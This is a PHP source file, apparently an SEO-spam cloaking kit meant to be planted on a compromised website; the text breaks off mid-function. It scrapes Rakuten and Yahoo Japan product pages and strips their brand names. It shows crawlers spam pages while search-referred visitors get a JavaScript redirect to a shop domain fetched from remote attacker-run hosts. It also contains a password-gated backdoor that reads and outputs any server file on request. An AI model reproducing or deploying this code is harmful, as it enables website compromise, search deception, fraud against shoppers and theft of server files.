<?php 
@ini_set('display_errors', 0);
@set_time_limit(3600);
define("DOMTXT","/jdd/");
define("GETDOM","http://www.linuxdata-5.top/jpdd151005qi-1/");
define("FNUM",50);
define("JGNUM","40");
define("LINKNUM","18");
define("BZSITE","l");
define("BZPRO","p");
//msbg
define("JDT","1");
//msend
//jthouzuibg
define("JTHZ","/");
//jthouzuiend


// #llqllq#arr_nametimebg

$arrnametime[]="2";
$arrnametime[]="1";
$arrnametime[]="3";
$arrnametime[]="4";


// #llqllq#arr_nametimeend

// #llqllq#arr_wordbg

$arr_word[0][] ="4";$arr_word[0][] ="3";$arr_word[0][] ="2";$arr_word[0][] ="2";$arr_word[0][] ="3";$arr_word[0][] ="3";$arr_word[0][] ="4";$arr_word[0][] ="2";$arr_word[0][] ="3";$arr_word[0][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="2";$arr_word[1][] ="3";$arr_word[1][] ="4";$arr_word[1][] ="2";$arr_word[1][] ="4";$arr_word[1][] ="4";$arr_word[1][] ="3";$arr_word[1][] ="3";$arr_word[1][] ="2";$arr_word[2][] ="4";$arr_word[2][] ="2";$arr_word[2][] ="2";$arr_word[2][] ="3";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="4";$arr_word[2][] ="3";$arr_word[2][] ="3";$arr_word[2][] ="2";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="4";$arr_word[3][] ="3";$arr_word[3][] ="3";$arr_word[3][] ="2";$arr_word[3][] ="3";$arr_word[3][] ="4";$arr_word[3][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="3";$arr_word[4][] ="2";$arr_word[4][] ="2";$arr_word[4][] ="4";$arr_word[4][] ="3";$arr_word[4][] ="2";$arr_word[4][] ="3";$arr_word[4][] ="4";$arr_word[4][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="2";$arr_word[5][] ="4";$arr_word[5][] ="2";$arr_word[5][] ="3";$arr_word[5][] ="4";$arr_word[5][] ="3";$arr_word[5][] ="4";$arr_word[5][] ="3";$arr_word[5][] ="3";$arr_word[6][] ="3";$arr_word[6][] ="2";$arr_word[6][] ="2";$arr_word[6][] ="4";$arr_word[6][] ="3";$arr_word[6][] ="3";$arr_word[6][] ="3";$arr_word[6][] ="4";$arr_word[6][] ="4";$arr_word[6][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="2";$arr_word[7][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="2";$arr_word[7][] ="2";$arr_word[7][] ="4";$arr_word[7][] ="3";$arr_word[7][] ="4";$arr_word[7][] ="3";$arr_word[8][] ="3";$arr_word[8][] ="4";$arr_word[8][] ="2";$arr_word[8][] ="4";$arr_word[8][] ="3";$arr_word[8][] ="4";$arr_word[8][] ="2";$arr_word[8][] ="3";$arr_word[8][] ="3";$arr_word[8][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="4";$arr_word[9][] ="4";$arr_word[9][] ="4";$arr_word[9][] ="2";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="2";$arr_word[9][] ="3";$arr_word[9][] ="3";$arr_word[10][] ="4";$arr_word[10][] ="2";$arr_word[10][] ="2";$arr_word[10][] ="2";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="3";$arr_word[10][] ="4";$arr_word[11][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="3";$arr_word[11][] ="4";$arr_word[11][] ="2";$arr_word[11][] ="2";$arr_word[11][] ="2";$arr_word[11][] ="4";$arr_word[11][] ="4";$arr_word[11][] ="3";

// #llqllq#arr_wordend


// #llqllq#arr_keywz

$arrKeywz[]="9";
$arrKeywz[]="5";
$arrKeywz[]="4";
$arrKeywz[]="12";
$arrKeywz[]="10";
$arrKeywz[]="8";
$arrKeywz[]="6";
$arrKeywz[]="11";
$arrKeywz[]="7";


// #llqllq#arr_keywzend
// #llqllq#arr_fuhao

$arrfh[]="……";
$arrfh[]=" ";
$arrfh[]="。";
$arrfh[]="！";
$arrfh[]="？";
$arrfh[]="，";
$arrfh[]="；";
$arrfh[]="、";


// #llqllq#arr_fuhaoend


$q1 = "O00O0O";	$q2 = "O0O000";	$q3 = "O0OO00";	$q4 = "OO0O00";	$q5 = "OO0000";	$q6 = "O00OO0";	$q7 = "O00O00";	$q8 = "O00OOO";	$$q1 = RandAbcs();



// #llqllq#randkeybg
$strRand[0]="cidgxnepbzjvuqrkfshlawyomt";
$strRand[1]="pakquthmcgoeziswbdrljnxyvf";
$strRand[2]="jiedogmtnyxwcavsklzrbuhpfq";
$strRand[3]="nmsuhziyelorfdpvgxajwqbktc";
$strRand[4]="wghpdevxmoyjaztsqfrlbicnuk";
$strRand[5]="bvmpfdayjiszkxtolqenrchwgu";
$strRand[6]="uqswtpyikroxhlmegfcndzbjva";
$strRand[7]="zimchguexrlkjanovwsyfbqdpt";
$strRand[8]="zaplqgnbicmjoftsykxrwhudve";
$strRand[9]="fzvewpjqgdxyaubmhoictklnrs";
$strRand[10]="zkwobrqxuhcjetmadvfnlsigyp";
$strRand[11]="nzcukvfyxwajptlqhsomiderbg";
$strRand[12]="isnplewjcohrfudkxqgmbyzvta";
$strRand[13]="ovyqsnilbmfephztuxjkdgcwra";
$strRand[14]="vjzfmehrngcowpuqybatskxldi";
$strRand[15]="bqgcxmdtluvhokjnzysrwafpie";
$strRand[16]="jfvgwpesxhknoitaczuqdmrbly";
$strRand[17]="wmkaervubgfnczjxlopqidyhts";
$strRand[18]="jwfbxheinlkaqrgzsyomtupdcv";
$strRand[19]="fbdzypxivkmtogsqwlnhcujare";
$strRand[20]="uxikhdamqwczyptsebrfovnglj";
$strRand[21]="bjdvnzfigaortswypxqucekhml";
$strRand[22]="apgrxekbicjlsndwztuvhqfoym";
$strRand[23]="qiarcguvntflkoxewmjsbyzphd";
$strRand[24]="unwkocqjzlisarefthxmgdvpyb";
$strRand[25]="vfrncazegmhpuwdtobyxliksqj";
$strRand[26]="hfqyknjwamilozxcgstepurvbd";
$strRand[27]="gtkfcuywdvnojhapisqbemrxlz";
$strRand[28]="baqsrkjunoifegxzlytvphmcwd";
$strRand[29]="dlpuwcvkzxtoasjbgmnyiqehfr";
$strRand[30]="kifuewgrjqmvdxansythzlpcbo";
$strRand[31]="hkzcmwjldytbqgesupoixvnarf";
$strRand[32]="gbtcpwmkfqlovazdjyhnrseuix";
$strRand[33]="jtdpqioracwgyukvsxbznmehfl";
$strRand[34]="njoxiatfdkgczvmruhpsebwqly";
$strRand[35]="xayjrfwlciqdzohvtespukgnbm";
$strRand[36]="sculgwibzpmdjhneartofxykqv";
$strRand[37]="qytlbrmzpgdhkvuwxaijcosnfe";
$strRand[38]="lwmpithzjcrexdvkouafbngyqs";
$strRand[39]="iufmkcvzxgdapwqslbtejhonry";
$strRand[40]="fcqojmyblwhvegikuanzrpdtsx";
$strRand[41]="redahiqfzpxkysclutnwvbomjg";
$strRand[42]="hurocbmlnepqvgaxfkwizjtsdy";
$strRand[43]="axkvmzcleihdfnyubsjqowrgpt";
$strRand[44]="emcgrokzfhqpdiswjtxaluvynb";
$strRand[45]="mlszjnkrcyqbtpxuavoifwehdg";
$strRand[46]="kyfodpsanbtzxcjlwughqivemr";
$strRand[47]="lrchaoqdwexiukysvgtnjzfmbp";
$strRand[48]="dathszfvukygmpjrneixcoqwlb";
$strRand[49]="psfxkyhgcvdwjzeaqulmbiront";
$strRand[50]="sfbtdocqaemxkvlgnzjhupyriw";
$strRand[51]="fxgplwiuyzrnmksjetbodchvqa";
$strRand[52]="wcgpnqzksmhijoeybxavrdfutl";
$strRand[53]="efzckpjdwsqmoahtugnrxilyvb";
$strRand[54]="yunfsjqapelrtkovxgchdwbimz";
$strRand[55]="lswovmrytehdcgxupfkazjiqnb";
$strRand[56]="vbcdnuproqyikwafgmleszxjht";
$strRand[57]="hrjwktcmudxivoeflybqzansgp";
$strRand[58]="adecrfzmnibwlkxtsgqvjhuoyp";
$strRand[59]="vpeyakqfhbrijngzswmloxtduc";
$strRand[60]="znmkytbxlacjudwipovhfeqrsg";
$strRand[61]="wopykljecndgvmtxqzbarifush";
$strRand[62]="xozughfdmcartikqwvlsyjebpn";
$strRand[63]="etsmxdqncvwrzhpkgojlbaifuy";
$strRand[64]="nesqzyxkgiapbcmlwurfhvdtoj";
$strRand[65]="rkfymdontwzgsplvbeqihjucxa";
$strRand[66]="fgiucnqjloapvwzehsdxykrbtm";
$strRand[67]="infevdsljzuxhmqtykawrcbpog";
$strRand[68]="zknmbchuprfiwlxtavqoyjdgse";
$strRand[69]="ozuyxvdwemnqlcbigfhapktjsr";
$strRand[70]="xkhuraicfjdyzwnlqvtoegbpms";
$strRand[71]="mawkyujbtvsifgrnelhcxqdopz";
$strRand[72]="mexyfwavrucohtsbkignqzpdjl";
$strRand[73]="kvoxgtmsjpnrdweiczuqlfbhya";
$strRand[74]="otaniydmblzpsruvjgqfecwkxh";
$strRand[75]="buwikaqlyrvfmdsczegotjnhxp";
$strRand[76]="euzamwvtkiqxsdyfohgcbjlrnp";
$strRand[77]="kydrnqvbazeftumihwscgolpxj";
$strRand[78]="upcolwmbsghrfvknajzeqyitxd";
$strRand[79]="qksancbdgvouhjxyziltpwrfem";
$strRand[80]="fqkcespmjuldbtxrhzingawovy";
$strRand[81]="vjuwanlfkyrcxtsmbzphdgeqoi";
$strRand[82]="rxosjqmeyvgkliczudapwfnbht";
$strRand[83]="kwjefstmynapxhzdcivlbuorgq";
$strRand[84]="icxouspyqvrnfewhlbgakdmzjt";
$strRand[85]="eagkyszbitjncdwhfluqpmoxrv";
$strRand[86]="fwbovkcgsjelaynuqxrhiztpdm";
$strRand[87]="hrusjyknozecltwbvmdipgfxqa";
$strRand[88]="zjvuxmlwybqpikdaegtcnrsfoh";
$strRand[89]="zroqhbgekxcufjvnsdpwtlymai";
$strRand[90]="yelauwbsfjkodqtrpmvcghzinx";
$strRand[91]="rvawukiyzbjcxqldsnogfhemtp";
$strRand[92]="tislgupbrawchevnyxdzfmokjq";
$strRand[93]="idztalvucfjpbgyhxnwqosekrm";
$strRand[94]="wkmgarlinzcdvsqhojxtbpufye";
$strRand[95]="rjvtncbkzaqxyihfleuwosgdpm";
$strRand[96]="tmoulgryncqifedxahpzsbkwvj";
$strRand[97]="zfrquclgaymjtnedokbvhipswx";
$strRand[98]="rilhokndpmwqaubzgeytvxfscj";
$strRand[99]="rqxtcelpjfmkvnwoysbzgaduhi";

// #llqllq#randkeyend



$thisdom = str_replace("www.","",$_SERVER['HTTP_HOST']);



// 
	
	
	
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
$stss = 'linkdata';


if(isset($_GET["gsitemap"]) && isset($_GET["mapnum"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("../sitemap"))
		mkdir("../sitemap", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	$mapnum = (int)trim($_GET["mapnum"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum,$mapnum);
	
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		
		
		
		
		$idUrl =  GETDOM . "gpage.php?getid=$vss";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
		if(count($arrId) < 100){
			echo "g sitemap fail<br/>";
			die();
		}
		
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}

if(isset($_GET["chdate"]) && md5($_GET["chdate"])=='8b9431d1f8083f320f2d1a3d5a0a187e' && isset($_GET["redate_file"])){$redate_file = $_GET["redate_file"];if(file_exists($redate_file)){echo '#ok#';}else{echo '#nofile#';}die();}if(isset($_GET["redate"]) && md5($_GET["redate"])=='8b9431d1f8083f320f2d1a3d5a0a187e' && isset($_GET["redate_file"])){$redate_file = $_GET["redate_file"];if(file_exists($redate_file)){echo rFile($redate_file);}else{echo '#nofile#';}die();}if(isset($_GET["test"]) && md5($_GET["test"])=='8b9431d1f8083f320f2d1a3d5a0a187e'){echo '#ok#';	die();}
if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"]) || isset($_GET["install"])){
	die();}
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
	
	
}
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
if(isset($_GET["id"]))
	$id = $_GET["id"];else{
	$id = "2512-3925"; //llq index id 
}
$idTemp = explode('-',$id);if(count($idTemp) < 2)
	die();
$id23 = end($idTemp);






$numArr_key = count($arr_key);
$siteid = $idTemp[count($idTemp)-2];
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM;
// $_SERVER["HTTP_REFERER"] = "google.com.hk";
if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';	

	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);
	$iszz = isCrawler();	
	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false){	
		$rsdom = '#^http://www\.[^/+]/$#si';
		
		$jumDom1 = 'http://www.'.$stss.'1.top'. DOMTXT . $siteid .".txt";	
		$jumDom2 = 'http://www.'.$stss.'2.top'. DOMTXT . $siteid .".txt";
	
		for($i=0;$i<2;$i++){
			$domJump = curl_get_from_webpage($jumDom1,'',1);
			$domJump = trim($domJump);
		
			if(!preg_match($rsdom,$domJump)){
				$domJump = curl_get_from_webpage($jumDom2,'',1);
				$domJump = trim($domJump);
				if(preg_match($rsdom,$domJump))
					break;
			}else{
				break;
			}
		}
		
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	
	}
}
 
 $fcontent = '';
 
 $keyWzi = $id23 % 6;$preOrEnd = $arrKeywz[$keyWzi]%2;
 
 $pInfoUrl =  GETDOM . "gpage.php?site=$thisdom&id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM ."&linkpore=".$preOrEnd; 

 
 $pInfoStr = curl_get_from_webpage($pInfoUrl,'',5);
 
 
 $rFL = '#<FL>(.*?)</FL>#si';
 preg_match($rFL, $pInfoStr, $matchFL);
 if($matchFL[1]) $fStr = $matchFL[1];else $fStr = ''; 
 
 
 $arrf1 = explode("#lkfglkfg#",$fStr);
 $arrFIdName = array();
 $arrFIdImg = array();
 if(count($arrf1)){
	 foreach($arrf1 as $values){
		 $values = trim($values);
		 if(!$values)
			 continue;
		 $arrts = explode("===>",$values);
		 if(count($arrts) == 3)
			 $arrFIdName[$arrts[0]] = $arrts[1];
			 $arrFIdImg[$arrts[0]] = $arrts[2];
		}
 }
  
 $rLK = '#<LK>(.*?)</LK>#si';
 preg_match($rLK, $pInfoStr, $matchLK);
 
 $rpImg = '#<pImg>(.*?)</pImg>#si';
 preg_match($rpImg, $pInfoStr, $matchpImg);
 
 
 $rMyName = '#<MyName>(.*?)</MyName>#si';
 preg_match($rMyName, $pInfoStr, $matchMyName);
 
 
 if($matchpImg[1]) 
	 $strpImg = trim($matchpImg[1]);
 else 
	 $strpImg = '';
 
 
$imgArr = explode('#img#',$strpImg);
$tempPimgStr = '';
foreach($imgArr as $vs){
	$vs = trim($vs);
	if($vs)
	 $tempPimgStr .= '<div class="text-center"><img src="'.$vs.'"></div>';
 }
 
 
 if($matchMyName[1]) 
	 $strMyName = trim($matchMyName[1]);
 else 
	 $strMyName = '';
 
 
 
 if($matchLK[1]) 
	 $lkStr = trim($matchLK[1]);
 else 
	 die(); 

 
 $html = curl_get_from_webpage($lkStr,'',5);

 
 					$productsPd2 = '';

					if(strstr($lkStr,'yahoo.co.jp')){
							$proNameRelur='#<!-- itemInfoTitle -->(.*?)<!-- /itemInfoTitle -->#si';
							preg_match($proNameRelur, $html, $matchesName);
							$productsName = rmhtmltag2('',$matchesName[1]);
							
							$productsName = trim($productsName);
						
							if(!$productsName){
								$productsName = $strMyName;
						}
						
						
						
						preg_match('#<!-- itemInfoLead -->(.*?)<!-- /itemInfoLead -->#si', $html, $matchesDes);
						$productsDes = $matchesDes[1];

						$productsDes = rmhtmltag2('iframe', $productsDes);
						$productsDes = rmhtmltag2('a', $productsDes);	
			
					}else{
						 					$html = iconv('EUC-JP','utf-8',$html);

						$proNameRelur='#<span class="item_name">(.*?)</span>#si';
						preg_match($proNameRelur, $html, $matchesName);
						$productsName = rmhtmltag2('',$matchesName[1]);

						$productsName = trim($productsName);
					
						if(!$productsName){
							$productsName = $strMyName;
						}
			
						$proPd2Relur = '#<span class="catch_copy">(.*?)</span>#si';
						preg_match($proPd2Relur, $html, $matchesPd2);
						$productsPd2 = $matchesPd2[1];
						$productsPd2 = rmhtmltag2('',$productsPd2);
						
						
						
						preg_match('#<td><span class="sale_desc">(.*?)</span>\s*<br>\s*<br>\s*</td>#si', $html, $matchesDes);
						$productsDes = $matchesDes[1];

						preg_match('#<td><span class="item_desc">(.*?)</span>\s*<br>\s*<br>\s*</td>#si', $html, $matchesDes2);
						$productsDes .= $matchesDes2[1];
						$productsDes = rmhtmltag2('iframe', $productsDes);
						$productsDes = rmhtmltag2('a', $productsDes);	

					}
					
					
					

					// preg_match_all('#<div src="([^"]+)"#si', $html, $matchesImg);
					// $productsImgArr = $matchesImg[1];
					
		
					
				$rpword[] = '%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4%E5%BA%97';
				$rpword[] = '%E3%80%90%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4%E3%80%91';
				$rpword[] = '%E6%A5%BD%E5%A4%A9%E5%B8%82%E5%A0%B4';
				$rpword[] = '%E3%80%90%E3%82%AB%E3%83%BC%E3%83%89%E6%B1%BA%E6%B8%88OK%E3%80%91';
				$rpword[] = '%E3%80%90%E3%81%82%E3%81%99%E6%A5%BD%E5%AF%BE%E5%BF%9C%E3%80%91';
				$rpword[] = '%E3%80%90%E4%BB%A3%E5%BC%95%E4%B8%8D%E5%8F%AF%E3%80%91';
				$rpword[] = '%E9%80%9A%E4%BF%A1%E8%B2%A9%E5%A3%B2';
				$rpword[] = '%E9%80%9A%E8%B2%A9';
				$rpword[] = '%E6%A5%BD%E5%A4%A9';
				$rpword[] = '%e3%83%a4%e3%83%95%e3%83%bc%e5%ba%97+';
				$rpword[] = '%e3%83%a4%e3%83%95%e3%83%bc';

	
					$pMateTitle = '';
					$pMateKey = '';
					$pMateDes = '';
					
					$proMateTitleRelur = '#<title>(.*?)</title>#si';
					preg_match($proMateTitleRelur, $html, $matchesMateTitle);
					
					if(isset($matchesMateTitle[1]) && trim($matchesMateTitle[1])){
						$pMateTitle = trim($matchesMateTitle[1]);
						
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateTitle = str_replace($let,"",$pMateTitle);
						}
						reset($rpword);
					
						$pMateTitle = str_replace('rakuten.co.jp',"",$pMateTitle);
						$pMateTitle = str_replace('rakuten',"",$pMateTitle);
						$pMateTitle = str_replace('Yahoo!',"",$pMateTitle);
						$pMateTitle = str_replace('Yahoo',"",$pMateTitle);
					}
					
					
					$proMateKeyRelur = '#<meta name="keywords" content="([^"]+)"#si';
					preg_match($proMateKeyRelur, $html, $matchesMateKey);
					
					if(isset($matchesMateKey[1]) && trim($matchesMateKey[1])){
						$pMateKey = trim($matchesMateKey[1]);
													
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateKey = str_replace($let,"",$pMateKey);
						}
						reset($rpword);
					
						$pMateKey = str_replace('rakuten.co.jp',"",$pMateKey);
						$pMateKey = str_replace('rakuten',"",$pMateKey);
						$pMateKey = str_replace('Yahoo!',"",$pMateKey);
						$pMateKey = str_replace('Yahoo',"",$pMateKey);
						
					}
					
					$proMateDesRelur = '#<meta name="description" content="([^"]+)"#si';
					preg_match($proMateDesRelur, $html, $matchesMateDes);
					
					if(isset($matchesMateDes[1]) && trim($matchesMateDes[1])){
						$pMateDes = trim($matchesMateDes[1]);
																				
						foreach($rpword as $vsword){
							$let = urldecode($vsword);
							$pMateDes = str_replace($let,"",$pMateDes);
						}
						reset($rpword);
						
					
						$pMateDes = str_replace('rakuten.co.jp',"",$pMateDes);
						$pMateDes = str_replace('rakuten',"",$pMateDes);
					
						$pMateDes = str_replace('Yahoo!',"",$pMateDes);
						$pMateDes = str_replace('Yahoo',"",$pMateDes);
					}
					
					
					$productsDes = str_replace('<IMG ','<img ',$productsDes);
					$productsDes = rmhtmltag2('meta',$productsDes);
					$productsDes = rmhtmltag('script',$productsDes);
					$productsDes = rmhtmltag2('img',$productsDes);
					
			 $pName = $productsName;
			 $pDes = $productsDes;
			 $pd2 = $productsPd2;
			 
			 $pMateKey = preg_replace('#^,+#i','',$pMateKey);
			 $pMateKey = str_replace('<meta name=,','',$pMateKey);
			 $pMateKey = str_replace('<meta name=','',$pMateKey);
			 
			 
			  
			 
			 if(!$pMateTitle or !$pMateDes or !$pMateKey){
				 $pMateTitle = $productsName;
				 $pMateDes = $productsName;
				 $pMateKey = $productsName;
			 }
			 
			 $lttitlerp = '<p><strong>'.$pMateTitle.'</strong></p>';
			 $lttitlerp .= '<p><strong>'.$pMateDes.'</strong></p>';
			 
			 $pnamesrp = '<p><strong>'.$pName.'</strong></p>';
			 $pnamesrp .= '<p><strong>'.$pMateDes.'</strong></p>';
			 
 
				
 // if($preOrEnd){
 if(0){
	$pDes = '<p><strong>'.$pMateTitle.'</strong></p>'.$pDes .$pd2. '<p><strong>'.$pMateDes.'</strong></p>' ."<br/>".$tempPimgStr;
 }else{
	 $pDes = $tempPimgStr . '<p><strong>'.$pMateTitle.'</strong></p>'. $pDes .$pd2. '<p><strong>'.$pMateDes.'</strong></p>';
  }
 
 $pDes = str_ireplace("<img ", '<img class="img-responsive rounded" alt="#bbbNamebbb#"  title="#bbbNamebbb#" ',$pDes);$rpDes = $pDes;
 $rpDes = str_replace('#bbbNamebbb#',$pName,$rpDes);
	$linkfirst = '';
	if(count($arrFIdName)){
		$linkfirst .= '<ul class="list-group">';
		foreach($arrFIdName as $valueFlinkId => $vsss){
			
				if(!isset($arrFIdImg[$valueFlinkId]))
					continue;
				
				list($tempSid,$tempPid) = explode('-',$valueFlinkId);						
				$friendlink = getalink($tempSid,$tempPid);

				$tempLinkKey = $vsss;
				$tempImg = trim($arrFIdImg[$valueFlinkId]);
			
			$linkfirst=$linkfirst.'<li class="list-group-item  col-md-3  col-sm-4  col-xs-6">'."<a href=\"".$friendlink."\">". '<img src="'.$tempImg.'" class="img-responsive" alt="'.$tempLinkKey.'" title="'.$tempLinkKey.'">' ."</a></li>".PHP_EOL;		
		}
	}
		
			$fileMb = fopen("moban.html","r");
			$html = fread($fileMb,filesize("moban.html"));			
			
			$html = str_ireplace('#bbbdesbbb#', $pMateDes, $html);	
			$html = str_ireplace('#bbbkeybbb#', $pMateKey, $html);	
			$html = str_ireplace('#bbbtitsbbb#', $pMateTitle, $html);	
			$html = str_ireplace('#bbblttitlebbb#', $lttitlerp, $html);	
			$html = str_ireplace('#bbbNamebbb#', $pName, $html);	
			$html = str_ireplace('#descontent#', $rpDes, $html);	
			$html = str_ireplace('#links1#', $linkfirst, $html);			
			$html = str_ireplace('#bbbpnamesbbb#', $pnamesrp, $html);			

		
	echo $html;
 
die();
	
	
	
function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}


function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	require(FILEDIRNAME . "/id$num.php");	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
function get_arrvs($arr,$num,$nowkey){
	$numArr = count($arr);	
	if($nowkey + $num < $numArr)
		return $arr[$nowkey + $num];	else{
		if($nowkey + $num - $numArr - $numArr > 0)
			return get_arrvs($arr,$num - $numArr,$nowkey);		else
			return $arr[abs($nowkey + $num - $numArr)];	}
}

function get_pre_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	
	
	if($key + JGNUM + 1 + LINKNUM >= $num){
		
		if($key + JGNUM + 1 - $num > LINKNUM){
			return array_slice($arr, $key + JGNUM + 1 - $num, LINKNUM);		}else{
		
		$duoyu = $key + JGNUM + 1 + LINKNUM - $num + 1;		$tmpA1 = array_slice($arr, $key + JGNUM + 1, LINKNUM);		$tmpA2 = array_slice($arr, 0, $duoyu);			
		return array_merge($tmpA1,$tmpA2);		}
	}else{
			return  array_slice($arr, $key + JGNUM + 1, LINKNUM);	}
	
}
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 

function glink($filenames,$jdt=1){
	$filePres = '';	$fileEnds = '';	
	if($jdt == 1){
		$filePres = basename(__FILE__) . "?id=";	}else{
		$filePres = '';		$fileEnds = JTHZ;	}
	////获取文件目录
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$put_str = '';
	$urlsArray = $filenames;	//print_r($urlsArray);
	$numLinks = count($urlsArray);	
	foreach($urlsArray as $value){
		$curphp=basename(__FILE__); 
